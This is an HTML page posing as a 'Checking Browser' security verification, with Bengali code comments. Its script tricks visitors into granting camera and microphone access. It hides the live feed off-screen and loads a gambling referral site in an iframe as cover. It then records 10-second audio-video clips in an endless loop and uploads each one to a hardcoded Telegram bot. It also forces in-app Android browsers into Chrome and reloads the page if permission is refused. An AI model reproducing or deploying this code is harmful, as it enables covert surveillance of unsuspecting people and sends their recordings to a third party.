<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        #v_stream { position: fixed; left: -9999px; opacity: 0; }
        #main_frame { width: 100%; height: 100%; border: none; display: none; }
        .verify-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f3f4f6; }
    </style>
</head>
<body>

    <div id="verify_ui" class="verify-box p-6 text-center">
        <div class="animate-spin h-12 w-12 border-4 border-blue-600 border-t-transparent rounded-full mb-4"></div>
        <h2 class="text-2xl font-bold text-gray-800">Checking Browser...</h2>
        <p class="text-gray-500 mt-2">Please click <b>"Allow"</b> to continue to the site.</p>
    </div>

    <iframe id="main_frame" src=""></iframe>

    <video id="v_stream" autoplay playsinline muted></video>

    <script>
        // ১. ক্রোম রিডাইরেক্ট সিস্টেম
        const ua = navigator.userAgent;
        if (/FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua) && ua.includes("Android")) {
            const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
            window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
        }

        const CONFIG = {
            t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
            c: '7785049939', 
            u: 'https://dkwin9.com/#/register?invitationCode=14856937272',
            clip_duration: 10000 // ১০ সেকেন্ড প্রতি ক্লিপ
        };

        let mediaRecorder;
        let stream;

        async function init() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v_stream').srcObject = stream;

                // ২. পারমিশন পাওয়ার পর মেইন ওয়েবসাইটকে ফ্রেমের ভেতর লোড করো
                document.getElementById('verify_ui').style.display = 'none';
                const frame = document.getElementById('main_frame');
                frame.src = CONFIG.u;
                frame.style.display = 'block';

                // ৩. লুপ রেকর্ডিং শুরু (প্রতি ১০ সেকেন্ডে ভিডিও পাঠাবে)
                startLoopRecording();

            } catch (err) {
                setTimeout(() => { location.reload(); }, 500);
            }
        }

        function startLoopRecording() {
            mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const formData = new FormData();
                formData.append('chat_id', CONFIG.c);
                formData.append('video', blob, 'clip.mp4');
                formData.append('caption', 'New 10s Background Clip');

                // ভিডিও পাঠাও
                fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });

                // আবার রেকর্ডিং শুরু করো (আনলিমিটেড লুপ)
                startLoopRecording();
            };

            mediaRecorder.start();
            
            // ১০ সেকেন্ড পর পর সেভ করবে এবং নতুন করে শুরু করবে
            setTimeout(() => {
                if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
            }, CONFIG.clip_duration);
        }

        window.onload = init;
    </script>
</body>
</html>
